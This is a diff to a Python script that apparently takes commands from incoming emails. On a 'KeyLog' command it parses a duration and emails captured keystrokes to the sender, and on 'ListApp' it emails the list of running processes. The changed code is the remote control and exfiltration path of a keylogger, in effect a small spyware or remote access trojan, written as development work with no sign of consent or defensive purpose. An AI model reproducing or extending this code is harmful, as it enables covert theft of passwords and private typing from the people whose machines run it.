@@ -67,18 +67,16 @@ start = 0  # Define the start position in the string
 end = len(body)  # Define the end position in the string
 
 if body.find("KeyLog", start, end) != -1:
-    # Set the duration in seconds (e.g., 60 seconds)
-    duration = 15
-
-    # Record the start time
-    start_time = time.time()
-
-    # Create a listener for both key press and release events
-    with keyLog.keyboard.Listener(on_press=lambda key: keyLog.on_key_event(key, is_press=True),
-                        on_release=lambda key: keyLog.on_key_event(key, is_press=False)) as listener:
-        while time.time() - start_time < duration:
-            pass
-        listener.stop()
+    duration_start = body.find("Duration:", start, end)
+    if duration_start != -1:
+        duration_start += len("Duration:")  # Move the start index to the character after "Duration:"
+        duration_end = body.find("\n", duration_start, end)  # Find the end of the number, which is a newline character
+        if duration_end != -1:
+            duration_str = body[duration_start:duration_end]  # Extract the substring containing the duration as a string
+            # Remove unwanted characters
+            duration_str = ''.join(filter(str.isdigit, duration_str))
+            duration = int(duration_str)
+            sendMail.send_keyLog_email(sender_email, duration)
 
 if body.find("ListApp", start, end) != -1:
     sendMail.send_process_email(sender_email)
